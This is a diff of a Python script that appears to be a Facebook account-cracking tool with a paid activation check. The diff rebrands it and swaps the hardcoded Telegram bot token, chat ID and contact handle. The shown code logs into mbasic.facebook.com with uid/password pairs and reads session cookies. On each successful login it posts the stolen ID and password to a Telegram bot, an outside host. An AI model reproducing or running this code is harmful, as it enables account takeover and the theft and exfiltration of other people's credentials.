@@ -1,4 +1,4 @@
-#decode by matin1337
+
 import os, sys, re, time, requests, json, random, calendar
 from multiprocessing.pool import ThreadPool
 from bs4 import BeautifulSoup as parser
@@ -21,7 +21,7 @@ def banner():
         uuid = str(os.geteuid()) + str(os.getlogin())
         id = "-".join(uuid)
         print("\x1b[37;1mYOUR ID: "+id)
-        print("###########################################################'")
+        print("♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡'")
 
 
 
@@ -29,7 +29,7 @@ def X():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
   print("\x1b[37;1mYOUR ID: "+id)
-  req = requests.get("https://raw.github.com/Russiboy404/id.py/main/id.txt").text
+  req = requests.get("https://github.com/Russiboy404/id.py/blob/main/id.txt").text
   if id in req:
       print("\x1b[37;1mYOUR ID: "+id)
       print("\033[92m YOUR ID IS ACTIVE .....")
@@ -38,7 +38,7 @@ def X():
       pass
   else:
       print("\x1b[37;1mYOUR ID: "+id)
-      print("\x1b[91m YOUR ID IS NOT ACTIVE SEND MESSAGE IN TELEGRAM > @i4m_Reba....")
+      print("\x1b[91m YOUR ID IS NOT ACTIVE SEND MESSAGE IN TELEGRAM > @Russi_....")
       banner()
       exit()
       
@@ -481,7 +481,7 @@ def manual():
 				kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 				if "c_user" in ses.cookies.get_dict().keys():
-					requests.post('https://api.telegram.org/bot5024188700:AAEBfcedrTHj4kKCrBNuFXIuTIBPxJ5PLAc/sendMessage?chat_id=1876206709&text=ID > '+uid+'\nPASS > '+pw+'\n')
+					requests.post('https://api.telegram.org/bot5252401613:AAFaHfa2m3W0tbqizWgmZS6gGrR10l08qQI/sendMessage?chat_id=1776972470&text=ID > '+uid+'\nPASS > '+pw+'\n')
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print("\r\033[0;94m[OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 					ok.append("%s|%s"%(uid, pw))
